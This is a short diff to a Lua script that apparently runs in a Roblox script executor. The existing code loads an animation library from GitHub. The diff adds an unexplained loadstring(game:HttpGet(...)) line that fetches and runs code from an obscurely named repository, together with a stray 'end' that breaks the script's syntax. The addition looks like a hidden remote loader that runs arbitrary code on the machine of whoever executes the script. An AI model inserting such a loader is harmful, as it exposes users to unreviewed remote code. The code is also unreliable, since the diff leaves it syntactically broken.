@@ -1,6 +1,8 @@
 if not getgenv()["Animator"] then
         loadstring(game:HttpGet("https://raw.githubusercontent.com/xhayper/Animator/main/Source/Main.lua"))()
 end
+loadstring(game:HttpGet("https://raw.githubusercontent.com/9274837292748/aawdadadadada/refs/heads/main/kasck"))()
+end
 task.wait(2.750)
 local player = game:GetService("Players").LocalPlayer
     local character = player.Character
